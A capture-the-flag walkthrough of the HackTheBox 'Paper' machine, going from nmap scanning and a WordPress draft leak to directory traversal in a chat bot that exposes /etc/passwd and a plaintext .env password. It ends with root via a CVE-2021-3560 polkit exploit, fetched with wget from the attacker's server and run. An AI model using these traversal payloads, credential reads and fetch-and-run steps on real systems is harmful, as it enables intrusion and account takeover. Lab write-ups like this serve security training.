# Paper Hackthebox

## Nmap
The paper box has been initiated with multiple nmap scans:
```sql
┌──(kali㉿kali)-[~/htb/paper]
└─$ nmap 10.129.136.31 | tee nmap                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-19 05:49 EST
Nmap scan report for 10.129.136.31
Host is up (0.076s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds

┌──(kali㉿kali)-[~/htb/paper]
└─$ nmap 10.129.136.31 -p 80,22,443 -sC -sV | tee nmapv 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-19 05:50 EST
Nmap scan report for 10.129.136.31
Host is up (0.078s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds

```

## Web Exploitation

Visiting `http://10.129.136.31/` outputs mostly a blank page with not much useful information, using the domain that nmap found through safe scripts on https doesn't change the page either.

There is an interesting header in the responses however, `X-Backend-Server: office.paper` which does resemble a domain name.
Running `sudo echo '10.129.136.31 office.paper' >> /etc/hosts` adds it to my hosts.

Now visiting `http://office.paper/` outputs a different page, it's mostly a twitter clone. A closer inspection of the HTML code reveales it's powered by Wordpress 5.2.3.

```sql
┌──(kali㉿kali)-[~/htb/paper]
└─$ searchsploit wordpress 5.2.3
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                       | php/webapps/51042.txt
WordPress Core 5.2.3 - Cross-Site Host Modification                                                                                           | php/webapps/47361.pl
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                       | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                       | php/dos/47800.py
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                           | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                     | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                   | php/webapps/48918.sh
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

The `Viewing Unauthenticated/Password/Private Posts` does seem relevant, as the website does have posts.

```bash
┌──(kali㉿kali)-[~/htb/paper]
└─$ cp /usr/share/exploitdb/exploits/multiple/webapps/47690.md ./

┌──(kali㉿kali)-[~/htb/paper]
└─$ cat 47690.md 
So far we know that adding `?static=1` to a wordpress URL should leak its secret content

Here are a few ways to manipulate the returned entries:

- `order` with `asc` or `desc`
- `orderby`
- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format


In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:  

```

This .md file tells me that just appending static=1 to the HTTP query string should reveal hidden content, so long as my page holds any.
Visting `http://office.paper/index.php/2021/?static=1` shows me a hidden post prisonmike has posted:
```md
[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!

```

Visiting this registration URL redirects me to a different domain, I added it to my hosts file with `sudo echo '10.129.136.31 chat.office.paper' >> /etc/hosts`

Upon refreshing, I get the page's content. After creating a user, and waiting a few seconds, the general chat gets loaded, the users are chatting about a recyclops bot, 
and they also talk about the fact that you can just direct message the bot.

Navigating the page, I found my way to the direct messages tab, where I then opened a DM with recyclops. Running `recyclops help` shows me commands 
such as `recyclops list sales/` and `recyclops file sales/secret.xls` can be run to read files.

Running `recyclops list sale/../../../../../../`
```sql
 Fetching the directory listing of sale/../../../../../../
total 28
dr-xr-xr-x. 17 root root 244 Jan 17 2022 .
dr-xr-xr-x. 17 root root 244 Jan 17 2022 ..
-rw-r--r-- 1 root root 0 Jan 14 2022 .autorelabel
lrwxrwxrwx 1 root root 7 Jun 22 2021 bin -> usr/bin
dr-xr-xr-x. 4 root root 4096 Jan 14 2022 boot
drwxr-xr-x 20 root root 3020 Jan 19 05:47 dev
drwxr-xr-x. 145 root root 8192 Jan 19 05:47 etc
drwxr-xr-x. 3 root root 20 Jan 14 2022 home
lrwxrwxrwx 1 root root 7 Jun 22 2021 lib -> usr/lib
lrwxrwxrwx. 1 root root 9 Jun 22 2021 lib64 -> usr/lib64
drwxr-xr-x. 2 root root 6 Jun 22 2021 media
drwxr-xr-x. 3 root root 18 Jun 22 2021 mnt
drwxr-xr-x. 3 root root 25 Jun 22 2021 opt
dr-xr-xr-x 270 root root 0 Jan 19 05:47 proc
dr-xr-x---. 8 root root 4096 Jan 19 05:48 root
drwxr-xr-x 44 root root 1200 Jan 19 05:49 run
lrwxrwxrwx 1 root root 8 Jun 22 2021 sbin -> usr/sbin
drwxr-xr-x. 2 root root 6 Jun 22 2021 srv
dr-xr-xr-x 13 root root 0 Jan 19 05:47 sys
drwxrwxrwt. 10 root root 4096 Jan 19 06:41 tmp
drwxr-xr-x. 13 root root 158 Jan 14 2022 usr
drwxr-xr-x. 22 root root 4096 Jan 14 2022 var
Fetching the directory listing of sale/../../../../../../root
ls: cannot open directory '/home/dwight/sales/sale/../../../../../../root': Permission denied
```

Shows me it's vulnerable to directory traversal, and so is the `file` command:

I ran `recyclops file ../../../../../../etc/passwd`
```sql
Bot
6:59 AM
<!=====Contents of file ../../../../../../etc/passwd=====>
root❌0:0:root:/root:/bin/bash
bin❌1:1:bin:/bin:/sbin/nologin
daemon❌2:2:daemon:/sbin:/sbin/nologin
adm❌3:4:adm:/var/adm:/sbin/nologin
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
sync❌5:0:sync:/sbin:/bin/sync
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
halt❌7:0:halt:/sbin:/sbin/halt
mail❌8:12:mail:/var/spool/mail:/sbin/nologin
operator❌11:0:operator:/root:/sbin/nologin
games❌12💯games:/usr/games:/sbin/nologin
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus❌81:81:System message bus:/:/sbin/nologin
systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd❌998:996:User for polkitd:/:/sbin/nologin
geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
```

The bot typing `:x:` seems to turn it into an X emoji, though, it does return the rest of the /etc/passwd file fine.

```sql
 Fetching the directory listing of ../
total 32
drwx------ 11 dwight dwight 281 Feb 6 2022 .
drwxr-xr-x. 3 root root 20 Jan 14 2022 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
-r-------- 1 dwight dwight 33 Jan 19 05:48 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```
It seems it's running in the home directory of dwight, based on the .ssh directory and bash files being present. The hubot directory does seem interesting though:
```sql
Fetching the directory listing of ../hubot/
total 564
drwx------ 8 dwight dwight 4096 Sep 16 2021 .
drwx------ 11 dwight dwight 281 Feb 6 2022 ..
-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \
srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env
-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
drwx------ 8 dwight dwight 163 Jul 3 2021 .git
-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
-rw-r--r-- 1 dwight dwight 430805 Jan 19 07:06 .hubot.log
-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json
-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak
-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts
-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
```

.env files in web applications typically hold login credentials, so I used the file command on it:
```sql
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
```

We are in the home directory of the user dwight, so I tried connecting with dwight:Queenofblad3s!23 over SSH.

```bash
┌──(kali㉿kali)-[~/htb/paper]
└─$ ssh dwight@office.paper   
The authenticity of host 'office.paper (10.129.136.31)' can't be established.
ED25519 key fingerprint is: SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'office.paper' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dwight@office.paper's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)

```

## Privilege Escalation

The first step I took was checking sudo, dwight had no privileges there however. Writing to either of the webapps didn't work either, and inspecting the hubot files further,
I found it directly runs on the dwight user, not rocketchat, so further exploitation there was unnecessary.

Running linpeas.sh tells me that it's vulnerable to CVE-2021-3560. Inspecting the polkit version manually with `pkaction --version` and searching about said version manually confirms it.

This CVE is essentially a race condition inside polkit, where it sends a dbus syscall to spawn in a user, and only after this does it check the permissions, this script tries to run a polkit
command that creates a user with unlimited sudo privileges, and kill the process very quickly after, creating the user successfully. This exploit does tend to take multiple tries, as it is a
race condition.

I grabbed `https://github.com/UNICORDev/exploit-CVE-2021-3560` this script off of github on my local machine, then transferred the script over HTTP to the Paper box.
```sql
[dwight@paper shm]$ wget http://10.10.14.162:6101/exploit-CVE-2021-3560.py
--2026-01-19 21:39:04--  http://10.10.14.162:6101/exploit-CVE-2021-3560.py
Connecting to 10.10.14.162:6101... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7452 (7.3K) [text/x-python]
Saving to: ‘exploit-CVE-2021-3560.py’

exploit-CVE-2021-3560.py                    100%[===========================================================================================>]   7.28K  --.-KB/s    in 0.01s   

2026-01-19 21:39:04 (748 KB/s) - ‘exploit-CVE-2021-3560.py’ saved [7452/7452]

[dwight@paper shm]$ ls
47164.sh  exploit.c  exploit-CVE-2021-3560.py  subuid_shell.c
[dwight@paper shm]$ python3 exploit-CVE-2021-3560.py 

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.    Y  / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_______|__\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2021-3560 (Polkit) - Local Privilege Escalation
USERNAME: unicord
PASSWORD: unicord
DEPENDS: Dependencies for exploit are met!
EXPLOIT: New user created!
PREPARE: New password hash generated!
EXPLOIT: Password configured for new user!
SUCCESS: Created Sudo user "unicord" with password "unicord"!

```

The output of the script lets me know it ran fine. Now I can just su to `unicord` and `sudo su`.
```sql
[dwight@paper shm]$ su unicord
Password: 
[unicord@paper shm]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for unicord: 
[root@paper shm]# id
uid=0(root) gid=0(root) groups=0(root)

```
`sudo su` gives me root because running su as root doesn't prompt for a password for any user, and specifying no user to switch to makes it assume it's root automatically.

User flag obtained from `/home/dwight/user.txt`
Root flag obtained from `/root/root.txt`
